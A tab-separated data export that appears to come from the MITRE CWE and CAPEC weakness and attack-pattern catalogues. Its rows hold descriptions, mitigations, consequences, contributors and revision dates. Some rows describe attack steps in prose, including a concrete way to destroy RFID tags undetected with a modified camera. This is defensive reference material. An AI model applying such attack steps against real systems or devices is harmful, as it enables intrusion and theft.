16276	42	Use a language that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.                   For example, many languages that perform their own memory management, such as Java and Perl, are not subject to buffer overflows. Other languages, such as Ada and C#, typically provide overflow protection, but the protection can be disabled by the programmer.                   Be wary that a language's interface to native code may still be subject to overflows, even if the language itself is theoretically safe.
11823	56	ChildOf
15445	62	updated Potential_Mitigations
8780	100	The MITRE Corporation
11060	39	2019-09-19
13071	88	Path Traversal: 'dir/../../filename'
18811	23	An adversary is able to exploit features of the target that should be reserved for privileged users or administrators but are exposed to use by lower or non-privileged accounts. Access to sensitive information and functionality must be controlled to ensure that only authorized users are able to access these resources. If access control mechanisms are absent or misconfigured, a user may be able to access resources that are intended only for higher level users. An adversary may be able to exploit this to utilize a less trusted account to gain information and perform activities reserved for more trusted accounts. This attack differs from privilege escalation and other privilege stealing attacks in that the adversary never actually escalates their privileges but instead is able to use a lesser degree of privilege to access resources that should be (but are not) reserved for higher privilege accounts. Likewise, the adversary does not exploit trust or subvert systems - all control functionality is working as configured but the configuration does not adequately protect sensitive resources at an appropriate level.
17532	100	The MITRE Corporation
24190	28	CWE Content Team
11882	88	Reliance on Untrusted Inputs in a Security Decision
14724	63	Alter Execution Logic
23030	21	CWE Content Team
16727	92	Exploit
24317	39	2011-06-01
25067	88	Logic/Time Bomb
17222	102	ChildOf
9029	63	Execute Unauthorized Code or Commands
20382	62	updated Observed_Examples
14226	35	Veracode
19487	31	700
15060	62	updated Relationships, Taxonomy_Mappings
16681	28	CWE Content Team
9262	35	MITRE
20739	90	C
22227	47	Read Data
13218	62	updated Relationships, Other_Notes
11270	91	Operation
23573	103	Primary
12492	56	ChildOf
21214	55	CAPEC Content Team
9353	79	Integrity
20184	81	Integrity
20784	100	The MITRE Corporation
13425	39	2011-09-13
13432	95	The attacker potentially leverages the buffer overflow to inject maliciously crafted code in an attempt to execute privileged command on the target environment.
18683	33	Johannes Ullrich
18414	72	If the value in question is important to data (as opposed to flow), simple data corruption has occurred. Also, if the wrap around results in other conditions such as buffer overflows, further memory corruption may occur.
12868	35	Cigital
11657	26	Implementation
18357	94	A successful DOM-based XSS attack can allow an adversary to tamper with application data.
24821	39	2012-05-11
12895	89	Detailed
11706	97	Malicious Hardware Update
11746	76	2019-09-30
24540	35	MITRE
21093	81	Access Control
5765	39	2012-05-11
15596	39	2008-11-24
15268	62	updated Applicable_Platforms
16965	39	2017-11-08
12978	89	Detailed
7820	23	The software does not maintain equal hashcodes for equal objects.
14759	103	Primary
11724	62	updated Time_of_Introduction
17959	81	Other
15030	62	updated Related_Attack_Patterns
9670	54	Medium
17418	100	The MITRE Corporation
18002	63	Reduce Performance
13871	102	ChildOf
12384	46	Authentication techniques should follow the algorithms that define them exactly, otherwise authentication can be bypassed or more easily subjected to brute force attacks.
17760	28	CWE Content Team
19553	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
8340	97	Inclusion of Code in Existing Process
23004	73	Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL.
10670	59	Updated Related_Attack_Patterns
21289	35	MITRE
9685	39	2019-01-03
22371	81	Integrity
12356	56	ChildOf
22068	92	Exploit
15190	28	CWE Content Team
5795	62	updated Potential_Mitigations, Time_of_Introduction
25149	101	CAPEC Content Team
22247	59	Updated Related_Attack_Patterns
14975	55	CAPEC Content Team
18308	28	CWE Content Team
7471	35	MITRE
14333	100	The MITRE Corporation
12870	33	Timothy H. Harrison
11860	102	ChildOf
20370	62	updated Applicable_Platforms, Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings
24017	28	CWE Content Team
17195	28	CWE Content Team
9429	35	MITRE
16343	21	CWE Content Team
21689	79	Integrity
6360	81	Other
7248	35	MITRE
22188	47	Execute Unauthorized Commands
15580	35	MITRE
24563	35	MITRE
24953	76	2019-04-04
22979	92	Exploit
13576	26	Implementation
22568	35	MITRE
21800	35	MITRE
10743	73	Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute request to other web sites (especially the web applications that have CSRF vulnerabilities).
5600	28	CWE Content Team
7581	33	Andrei Alexandrescu
12972	43	Simple
6419	50	Ensure that to the extent possible, no sensitive data is passed from the server to the client via JSON objects. JavaScript was never intended to play that role, hence the same origin policy does not adequate address this scenario.
24005	77	Architecture or Design Review
12945	23	An adversary who is authorized or has the ability to search known system resources, does so with the intention of gathering useful information. System resources include files, memory, and other aspects of the target system. In this pattern of attack, the adversary does not necessarily know what they are going to find when they start pulling data. This is different than CAPEC-150 where the adversary knows what they are looking for due to the common location.
23924	62	updated Alternate_Terms, Relationships, Theoretical_Notes
22038	31	1000
16379	61	Draft
10988	39	2017-11-08
9777	28	CWE Content Team
11347	63	Bypass Protection Mechanism
19890	62	updated Relationships
23610	42	Adequate consideration should be put in to the user interface in order to notify users previous to the key's expiration, to explain the importance of new key generation and to walk users through the process as painlessly as possible.
24067	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
22865	56	ChildOf
13750	74	2
23541	91	Architecture and Design
13836	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
7099	28	CWE Content Team
20061	28	CWE Content Team
20716	101	CAPEC Content Team
24861	62	updated Relationships
15019	39	2011-03-29
22424	60	30
18956	35	MITRE
22701	23	Adversaries inject data into mobile technology traffic (data flows or signaling data) to disrupt communications or conduct additional surveillance operations.
24126	62	updated Common_Consequences
19425	26	Architecture and Design
13483	39	2011-03-29
20049	43	Simple
18218	45	Variant
6472	69	Draft
21936	62	updated Common_Consequences, References, Relationships, Taxonomy_Mappings
8257	28	CWE Content Team
20791	28	CWE Content Team
15915	39	2019-01-03
24980	95	[Spider] Using a browser or an automated tool, an attacker records all entry points for inputs that happen to be reflected in a client-side non-script element. These non-script elements can be located in the HTML content (head, body, comments), in an HTML tag, XML, CSS, etc.
11223	28	CWE Content Team
24120	35	MITRE
23756	28	CWE Content Team
13978	101	CAPEC Content Team
19464	54	Low
21516	63	DoS: Crash, Exit, or Restart
6586	35	MITRE
18970	66	Preventing CSRF and XSRF Attacks
21604	28	CWE Content Team
11591	21	CWE Content Team
14501	35	MITRE
17312	23	The software performs a calculation that generates incorrect or unintended results that are later used in security-critical decisions or resource management.
9400	43	Simple
16604	81	Availability
21927	31	1000
9672	63	Modify Application Data
24271	35	Cigital
14217	28	CWE Content Team
6051	39	2008-09-08
24238	39	2009-10-29
15643	31	1000
8285	62	updated Relationships, Taxonomy_Mappings
7414	35	MITRE
7420	103	Primary
24720	28	CWE Content Team
22216	39	2014-07-30
15834	90	C
22458	28	CWE Content Team
17892	28	CWE Content Team
12186	35	MITRE
16139	28	CWE Content Team
8115	27	The ability to send TCP SYN segments to a host during network reconnaissance via the use of a network mapper or scanner, or via raw socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response.
17733	40	This type of an attack requires the ability to generate a large amount of UDP traffic to send to the desired port of a target service using UDP.
23897	42	Developers should anticipate that multiple leading special elements will be injected/removed/manipulated in the input vectors of their software system. Use an appropriate combination of black lists and whitelists to ensure only valid, expected and appropriate input is processed by the system.
18154	62	updated References, Relationships, Taxonomy_Mappings
15405	62	updated Applicable_Platforms
7442	39	2010-09-27
6448	79	Availability
14892	35	MITRE
23351	61	Draft
9623	90	C#
24032	42	Close cursors immediately after access to them is complete. Ensure that you close cursors if exceptions occur.
11387	35	MITRE
11553	96	2018-07-02
14107	90	Language-Independent
21037	69	Draft
21076	62	updated Description, Terminology_Notes
6759	101	CAPEC Content Team
15231	33	Mike Shema
16779	28	CWE Content Team
7440	77	Architecture or Design Review
14128	56	ChildOf
8600	72	An attacker could guess the random numbers generated and could gain unauthorized access to a system if the random numbers are used for authentication and authorization.
22975	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Focused Manual Spotcheck - Focused manual analysis of source                            Manual Source Code Review (not inspections)
15166	56	ChildOf
14213	56	ChildOf
19067	104	51
20243	79	Integrity
15191	93	High
8250	23	An adversary engages in active probing and exploration activities to determine the type or version of an application installed on a remote target. This differs from fingerprinting where the attacker's action is passive through the examination of application output.
13969	28	CWE Content Team
12807	51	2014-06-23
23514	79	Confidentiality
17149	28	CWE Content Team
21408	39	2011-06-01
18417	72	In some cases, injectable code controls authentication; this may lead to a remote vulnerability.
25357	62	updated Relationships
25170	23	The software allows an entity to perform a legitimate but expensive operation before authentication or authorization has taken place.
20807	63	Reduce Maintainability
18350	105	Web Based
5703	23	An adversary discovers connections between systems by exploiting the target system's standard practice of revealing them in searchable, common areas. Through the identification of shared folders/drives between systems, the adversary may further their goals of locating and collecting sensitive information/files, or map potential routes for lateral movement within the network.
16162	76	2019-09-30
19151	35	Cigital
6466	35	MITRE
8349	100	The MITRE Corporation
13538	31	699
12740	35	MITRE
15835	28	CWE Content Team
20042	22	01
12326	62	updated Related_Attack_Patterns, Relationships
22697	81	Access Control
13461	35	MITRE
9346	40	The targeted program is giving away information about itself. Before performing such attack, an eventual attacker may need to gather information about the services running on the host target. The more the host target is verbose about the services that are running (version number of application, etc.) the more information can be gather by an attacker.
15004	39	2017-11-08
15278	88	Use of Unmaintained Third Party Components
9297	88	Use of sizeof() on a Pointer Type
5991	52	This weakness can be found easily using static analysis. However in some cases an operator might appear to be incorrect, but is actually correct and reflects unusual logic within the program.
24627	35	MITRE
6512	26	Implementation
11853	35	MITRE
12284	39	2011-06-01
23588	62	updated Demonstrative_Examples, Relationships
8582	70	Socket Capable Browser Plugins Result In Transparent Proxy Abuse
24467	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.                   When constructing OS command strings, use stringent whitelists that limit the character set based on the expected value of the parameter in the request. This will indirectly limit the scope of an attack, but this technique is less important than proper output encoding and escaping.                   Note that proper output encoding, escaping, and quoting is the most effective solution for preventing OS command injection, although input validation may provide some defense-in-depth. This is because it effectively limits what will appear in output. Input validation will not always prevent OS command injection, especially if you are required to support free-form text fields that could contain arbitrary characters. For example, when invoking a mail program, you might need to allow the subject field to contain otherwise-dangerous inputs like ";" and ">" characters, which would need to be escaped or otherwise handled. In this case, stripping the character might reduce the risk of OS command injection, but it would produce incorrect behavior because the subject field would not be recorded as the user intended. This might seem to be a minor inconvenience, but it could be more important when the program relies on well-structured subject lines in order to pass messages to other components.                   Even if you make a mistake in your validation (such as forgetting one out of 100 input fields), appropriate encoding is still likely to protect you from injection-based attacks. As long as it is not done in isolation, input validation is still a useful technique, since it may significantly reduce your attack surface, allow you to detect some attacks, and provide other security benefits that proper encoding does not address.
24010	35	MITRE
6789	81	Other
20256	39	2008-10-14
22522	28	CWE Content Team
24854	39	2011-09-13
13418	76	2019-09-30
13384	68	Note that this can be bypassed using XSS (CWE-79). An attacker could use XSS to generate a spoofed Referer, or to generate a malicious request from a page whose Referer would be allowed.
9916	89	Detailed
19854	39	2017-11-08
10267	96	2018-07-02
24816	35	MITRE
14933	88	Use of a One-Way Hash without a Salt
13411	35	MITRE
12110	76	2019-04-04
11145	90	Python
18192	62	updated Demonstrative_Examples, Potential_Mitigations
9247	35	MITRE
17087	56	ChildOf
11302	42	Run the code in a "jail" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.                   OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.                   This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.                   Be careful to avoid CWE-243 and other weaknesses related to jails.
20459	40	Scripting is enabled in the client's browser
17818	39	2011-03-29
14722	28	CWE Content Team
8733	39	2008-07-01
15622	35	MITRE
8569	28	CWE Content Team
7216	35	MITRE
6233	35	MITRE
6001	27	None: No specialized resources are required to execute this type of attack.
20988	28	CWE Content Team
21888	101	CAPEC Content Team
21523	79	Confidentiality
19498	28	CWE Content Team
15177	62	updated Potential_Mitigations
19837	56	CanPrecede
10480	35	MITRE
20184	72	The object could potentially be tampered with.
24274	28	CWE Content Team
12213	79	Confidentiality
7869	28	CWE Content Team
16540	32	Safecode.org
18832	62	updated Relationships, Taxonomy_Mappings
13254	28	Eric Dalci
11527	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
18789	102	ChildOf
14796	62	Suggested OWASP Top Ten 2004 mapping
17061	62	updated Potential_Mitigations
8639	39	2010-12-13
8615	26	Implementation
16657	35	MITRE
18143	104	449
9589	79	Integrity
8487	62	updated Common_Consequences
10597	42	Never trust or rely any of the information in an Event for security.
22034	62	updated Name, Relationships
17018	28	CWE Content Team
11077	76	2019-04-04
23800	39	2014-07-30
16690	51	2014-06-23
15073	35	MITRE
21326	39	2010-09-27
23068	39	2011-03-29
15660	39	2008-08-15
19785	47	Other
22856	59	Updated Description, Execution_Flow, Related_Attack_Patterns
11984	32	Addison-Wesley
14310	23	The source code contains comments that do not accurately      describe or explain aspects of the portion of the code with which the comment is      associated.
24183	35	MITRE
14775	47	Alter Execution Logic
21560	35	MITRE
16601	39	2017-11-08
6947	46	When performing tasks such as whitelist validation, data is examined and possibly modified to ensure that it is well-formed and adheres to a list of safe values. If the regular expression is not anchored, malicious or malformed data may be included before or after any string matching the regular expression. The type of malicious data that is allowed will depend on the context of the application and which anchors are omitted from the regular expression.
25025	23	The software uses or accesses a resource that has not been initialized.
7023	67	Low
22416	74	4
19978	88	Improperly Implemented Security Check for Standard
6860	66	Tarsnap - The scrypt key derivation function and encryption utility
7125	35	MITRE
15195	56	ChildOf
16146	86	http://erpscan.com/wp-content/uploads/2012/08/SSRF-vs-Businness-critical-applications-whitepaper.pdf
15152	26	Implementation
17092	28	CWE Content Team
22487	59	Updated Description, Description Summary
17780	28	CWE Content Team
11777	45	Variant
7024	35	MITRE
20366	72	Potentially a replay attack, in which an attacker could send the same data twice, could be crafted if nonces are allowed to be reused. This could allow a user to send a message which masquerades as a valid message from a valid user.
23812	26	Architecture and Design
8684	78	Low
6158	62	updated Taxonomy_Mappings
11993	76	2017-05-01
11469	53	The MITRE Corporation
21436	103	Primary
13595	39	2009-07-27
21477	62	updated Description
18541	35	MITRE
15387	39	2017-11-08
10308	43	Simple
8465	63	Modify Files or Directories
6533	31	1000
23425	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Manual Source Code Review (not inspections)                                                                     Cost effective for partial coverage:                                                                           Focused Manual Spotcheck - Focused manual analysis of source
20014	79	Availability
11003	55	CAPEC Content Team
12748	74	2
16582	26	Architecture and Design
22768	26	Implementation
7528	62	updated Demonstrative_Examples
16350	25	Low
9381	59	Updated Related_Attack_Patterns
20483	62	updated Common_Consequences
21640	72	An attacker may be able to read sensitive data.
25087	60	17
17578	53	The MITRE Corporation
19474	28	CWE Content Team
16235	78	High
8414	28	CWE Content Team
18515	39	2009-05-27
19698	39	2008-11-24
13155	62	updated Potential_Mitigations
10216	90	Language-Independent
18326	60	19
11556	62	updated Common_Consequences, Relationships, Other_Notes
19977	23	The software contains an expression that will always evaluate to false.
23655	40	This type of attack requires a server that accepts XML data and parses the data.
11720	62	updated Observed_Examples
17764	39	2010-12-13
18939	62	updated Modes_of_Introduction, Relationships, Taxonomy_Mappings
17146	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
9023	31	1000
24292	79	Authorization
16775	76	2019-04-04
22133	49	2000
15113	101	CAPEC Content Team
10956	35	MITRE
22691	48	05
10433	39	2014-06-23
18532	90	Language-Independent
18382	59	Updated Related_Attack_Patterns
10947	88	Excessive Use of Hard-Coded Literals in Initialization
6426	39	2019-01-03
22841	88	Data Resource Access without Use of Connection Pooling
21838	62	updated Relationships, Taxonomy_Mappings
16950	31	1003
12359	39	2014-07-30
24114	39	2014-07-30
22859	32	McGraw Hill
18663	101	CAPEC Content Team
19447	81	Availability
11492	53	The MITRE Corporation
22265	72	The application can operate on unexpected files. Confidentiality is violated when the targeted filename is not directly readable by the attacker.
16664	91	Implementation
22095	85	584
18464	80	A variety of password cracking tools are available that can leverage a rainbow table. The more difficult part is to obtain the password hash(es) in the first place.
23986	42	For web applications, make sure that the access control mechanism is enforced correctly at the server side on every page. Users should not be able to access any unauthorized functionality or information by simply requesting direct access to that page.                   One way to do this is to ensure that all pages containing sensitive information are not cached, and that all such pages restrict access to requests that are accompanied by an active and authenticated session token associated with a user who has the required permissions to access that page.
15196	85	105
6402	81	Other
21140	31	699
14765	28	CWE Content Team
24154	35	MITRE
14385	40	The adversary requires physical access to the targeted communications equipment (networking devices, cables, etc.), which may be spread over a wide area.
15063	30	Gordon "Fyodor" Lyon
20877	102	ChildOf
12700	28	CWE Content Team
23934	61	Usable
20828	35	MITRE
18629	31	699
17341	62	updated Time_of_Introduction
7281	35	MITRE
17185	88	Call to Non-ubiquitous API
19483	56	CanPrecede
14373	62	updated Potential_Mitigations, Time_of_Introduction
7578	40	The target host exposes an API to the user.
19470	43	Simple
17771	97	Replace File Extension Handlers
24758	79	Confidentiality
10294	62	updated Description, Relationships, Other_Notes, Weakness_Ordinalities
25068	62	updated Relationships, Taxonomy_Mappings
21554	62	updated Relationships, Taxonomy_Mappings
10020	59	Updated Related_Weaknesses
23125	39	2008-07-01
13293	23	Truncation errors occur when a primitive is cast to a primitive of a smaller size and data is lost in the conversion.
18888	62	updated Common_Consequences, Relationships
11881	73	Perform command injection.
23911	63	Quality Degradation
11073	28	CWE Content Team
21946	51	2014-06-23
20988	62	updated Demonstrative_Examples, Relationships
6032	28	CWE Content Team
20723	56	ChildOf
13738	26	Operation
19478	53	The MITRE Corporation
14680	62	updated Common_Consequences, Relationships, Other_Notes, Weakness_Ordinalities
6848	47	Other
10700	35	MITRE
9930	51	2014-06-23
10339	62	updated References
9194	39	2010-06-21
7666	26	Implementation
13720	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Focused Manual Spotcheck - Focused manual analysis of source                            Manual Source Code Review (not inspections)
5600	62	updated References
6849	103	Primary
13193	46	This can happen in signed and unsigned cases.
7367	104	706
23562	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Formal Methods / Correct-By-Construction                                                                     Cost effective for partial coverage:                                                                           Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)
19261	100	The MITRE Corporation
25012	27	A tool capable of sending and receiving packets from a remote system.
22722	31	1000
19196	81	Integrity
11180	36	https://www.acunetix.com/blog/articles/elaborate-ways-exploit-xss-flash-parameter-injection/
9276	63	Unexpected State
21002	35	MITRE
13105	28	CWE Content Team
8613	39	2011-06-01
7607	39	2018-03-27
7760	35	MITRE
12654	73	Observe the ordering of the several HTTP response headers. The ordering of the header of each server may have unique identities.
18563	28	CWE Content Team
10425	42	Use products or modules that conform to FIPS 140-2 [REF-267] to avoid obvious entropy problems. Consult FIPS 140-2 Annex C ("Approved Random Number Generators").
24240	91	Implementation
15782	39	2010-06-21
9734	101	CAPEC Content Team
10783	55	Seamus Tuohy
18567	28	CWE Content Team
20041	59	Updated Attack_Motivation-Consequences
9118	62	updated Description
14688	103	Primary
8564	94	Run Arbitrary Code
23029	45	Variant
14659	56	ChildOf
10219	35	MITRE
14402	35	MITRE
18834	39	2011-06-01
23790	50	Leverage file protection mechanisms to render these files accessible only to authorized parties.
17244	39	2010-09-27
5591	35	Cigital
6717	39	2014-07-30
7989	92	Exploit
12506	22	06
17140	21	PLOVER
16305	69	Incomplete
6373	81	Integrity
23494	104	181
24394	91	Implementation
21856	55	CAPEC Content Team
10123	39	2011-06-01
19307	39	2009-12-28
23416	28	CWE Content Team
22858	28	CWE Content Team
6170	76	2017-01-09
18200	73	Use a proxy tool to record all links visited during a manual traversal of the web application.
16470	101	CAPEC Content Team
23793	88	Improperly Controlled Modification of Dynamically-Determined Object Attributes
21730	35	MITRE
8080	62	updated Demonstrative_Examples, Relationships, Taxonomy_Mappings
13803	102	CanPrecede
11082	77	Automated Static Analysis
19110	28	CWE Content Team
9863	28	Eric Dalci
23510	26	Architecture and Design
14146	46	This issue makes it more difficult to understand and/or maintain the software, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.
15968	56	ChildOf
17527	73	Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.
10176	21	PLOVER
16683	32	The Open Web Application Security Project (OWASP)
8317	62	updated Time_of_Introduction
18023	77	Architecture or Design Review
25223	28	CWE Content Team
12190	101	CAPEC Content Team
8594	79	Confidentiality
10401	28	CWE Content Team
20205	39	2011-06-01
6536	26	Architecture and Design
17047	35	MITRE
11427	31	1000
8536	62	updated Description
23401	28	CWE Content Team
9080	62	updated References, Related_Attack_Patterns, Relationships, Taxonomy_Mappings
24102	79	Confidentiality
8719	44	SOAR Partial
19898	99	Sun Microsystems
19781	39	2012-05-11
20793	62	updated Related_Attack_Patterns, Relationships
13968	62	updated Relationships
8431	62	updated Relationships, Taxonomy_Mappings
8318	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.                   When validating filenames, use stringent whitelists that limit the character set to be used. If feasible, only allow a single "." character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as "/" to avoid CWE-36. Use a whitelist of allowable file extensions, which will help to avoid CWE-434.                   Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a blacklist, which may be incomplete (CWE-184). For example, filtering "/" is insufficient protection if the filesystem also supports the use of "\" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if "../" sequences are removed from the ".../...//" string in a sequential fashion, two instances of "../" would be removed from the original string, but the remaining characters would still form the "../" string.
14000	39	2017-11-08
12089	35	MITRE
21876	39	2013-02-21
8099	39	2009-05-27
8537	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
17523	62	updated Relationships, Taxonomy_Mappings
10790	62	updated Detection_Factors
12817	100	The MITRE Corporation
22827	62	updated Time_of_Introduction
21610	77	Manual Static Analysis - Binary or Bytecode
23590	28	CWE Content Team
10361	39	2019-01-03
17208	45	Variant
7140	39	2012-10-30
5709	43	Simple
12882	42	In order to usefully check if a given action is authorized, some means of strong authentication and method protection must be used. Use other means of authorization that cannot be simply spoofed. Possibilities include a username/password or certificate.
10657	39	2008-07-01
16396	101	CAPEC Content Team
9841	78	High
11609	35	MITRE
9449	91	Implementation
19684	39	2013-02-21
15970	72	This weakness can lead to the exposure of resources or functionality to unintended actors, possibly providing attackers with sensitive information or even execute arbitrary code.
20070	69	Incomplete
15178	39	2011-06-01
13831	63	DoS: Resource Consumption (CPU)
22270	39	2010-09-27
24435	85	142
22895	56	ChildOf
17183	97	Generic Cross-Browser Cross-Domain Theft
8591	28	Eric Dalci
21397	35	MITRE
19937	85	108
6986	102	ChildOf
16208	59	Updated Description Summary, Related_Attack_Patterns
14628	42	For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.
22279	31	1000
10806	63	Modify Application Data
13961	35	MITRE
14454	23	Source code on a web server often contains sensitive information and should generally not be accessible to users.
22112	50	Design: Use libraries and templates that minimize unfiltered input. Use methods that limit entity expansion and throw exceptions on attempted entity expansion.
10753	45	Base
11163	35	MITRE
10373	62	updated Relationships
25037	62	updated Description
16028	39	2008-07-01
15831	35	Cigital
22447	104	93
15301	35	MITRE
8846	92	Explore
25287	39	2017-01-19
9552	43	Simple
15963	26	Implementation
22228	28	CWE Content Team
18664	28	Eric Dalci
21893	91	Architecture and Design
20965	39	2014-07-30
19056	39	2008-09-08
11991	45	Variant
22810	35	MITRE
21517	69	Incomplete
8140	103	Primary
22161	85	630
22744	54	Medium
24989	33	David Litchfield
15259	39	2011-06-01
19086	81	Access Control
6408	35	MITRE
21654	74	3
23220	78	High
6267	28	CWE Content Team
12628	23	The software does not follow certain coding rules for development, which can lead to resultant weaknesses or increase the severity of the associated vulnerabilities.
16024	39	2019-06-20
8562	104	494
23599	28	Eric Dalci
12892	77	Dynamic Analysis with Manual Results Interpretation
8583	47	Gain Privileges
17103	56	ChildOf
12575	62	updated Relationships, Observed_Example, Other_Notes, Taxonomy_Mappings
7011	28	CWE Content Team
15818	39	2012-10-30
15744	31	699
22060	81	Availability
10013	35	MITRE
20000	62	updated Related_Attack_Patterns
19278	62	updated Demonstrative_Examples
22464	28	CWE Content Team
14351	28	CWE Content Team
16739	101	CAPEC Content Team
25256	28	CWE Content Team
19877	28	CWE Content Team
15714	39	2009-05-27
10554	49	2004
14197	39	2017-11-08
22178	39	2017-11-08
14709	102	ChildOf
15746	28	CWE Content Team
9250	56	ChildOf
7069	42	Use a tool that dynamically detects memory management problems, such as valgrind.
18313	35	MITRE
20640	81	Other
21638	62	updated Applicable_Platforms, Common_Consequences
6146	39	2012-05-11
14322	104	668
10530	103	Primary
12811	85	46
23760	62	updated References, Relationships
17536	39	2009-05-27
15342	28	CWE Content Team
18664	39	2008-07-01
10335	43	Simple
15562	40	The application performs insufficient filtering/canonicalization on the URLs.
20523	45	Variant
14659	31	1003
8933	39	2010-02-16
23188	62	updated Relationships
8612	89	Standard
9838	35	MITRE
19842	81	Other
19838	42	Divide the software into anonymous, normal, privileged, and administrative areas. Identify which of these areas require a proven user identity, and use a centralized authentication capability.                   Identify all potential communication channels, or other means of interaction with the software, to ensure that all channels are appropriately protected. Developers sometimes perform authentication at the primary channel, but open up a secondary channel that is assumed to be private. For example, a login mechanism may be listening on one network port, but after successful authentication, it may open up a second port where it waits for the connection, but avoids authentication because it assumes that only the authenticated party will connect to the port.                   In general, if the software or protocol allows a single session or user state to persist across multiple connections or channels, authentication and appropriate credential management need to be used throughout.
6703	28	CWE Content Team
22632	62	updated Relationships
22972	77	Manual Static Analysis - Binary or Bytecode
21678	91	Operation
22962	69	Draft
7026	26	Implementation
10417	35	MITRE
12915	62	updated Name
5822	102	ChildOf
17172	42	Use industry standard libraries to encrypt passwords before storage in configuration files.
17173	35	MITRE
14049	24	MITRE
7765	39	2010-04-05
24749	39	2017-11-08
6268	101	CAPEC Content Team
12964	35	MITRE
22013	23	An attacker uses methods to deactivate a passive RFID tag for the purpose of rendering the tag, badge, card, or object containing the tag unresponsive. RFID tags are used primarily for access control, inventory, or anti-theft devices. The purpose of attacking the RFID chip is to disable or damage the chip without causing damage to the object housing it. When correctly performed the RFID chip can be disabled or destroyed without visible damage or marking to whatever item or device containing the chip. Attacking the chip directly allows for the security device or method to be bypassed without directly damaging the device itself, such as an alarm system or computer system Various methods exist for damaging or deactivating RFID tags. For example, most common RFID chips can be permanently destroyed by creating a small electromagnetic pulse near the chip itself. One method employed requires the modifying a disposable camera by disconnecting the flash bulb and soldering a copper coil to the capacitor. Firing the camera in this configuration near any RFID chip-based device creates an EMP pulse sufficient to destroy the chip without leaving evidence of tampering. So far this attack has been demonstrated to work against RFID chips in the 13.56 MHz range.
5796	91	Implementation
20942	36	http://media.blackhat.com/bh-us-11/Dinaburg/BH_US_11_Dinaburg_Bitsquatting_WP.pdf
8893	88	Allocation of File Descriptors or Handles Without Limits or Throttling
16101	28	CWE Content Team
11695	35	Cigital
21594	31	699
19702	62	updated Related_Attack_Patterns
7293	26	Implementation
8474	39	2010-02-16
21720	28	CWE Content Team
14149	39	2019-01-03
11301	35	MITRE
11177	100	The MITRE Corporation
15140	39	2017-01-19
11199	35	MITRE
12435	62	updated Alternate_Terms, Applicable_Platforms, References
21851	56	ChildOf
21460	40	Access to the download and update system(s) used to deliver BIOS images.
12580	89	Detailed
13853	35	MITRE
20295	69	Draft
17259	62	updated Demonstrative_Examples
13975	39	2011-06-27
5936	50	Application Architects must be careful to design callback, signal, and similar asynchronous constructs such that they shed excess privilege prior to handing control to user-written (thus untrusted) code.
21392	59	Updated Description Summary, Related_Attack_Patterns
6290	85	573
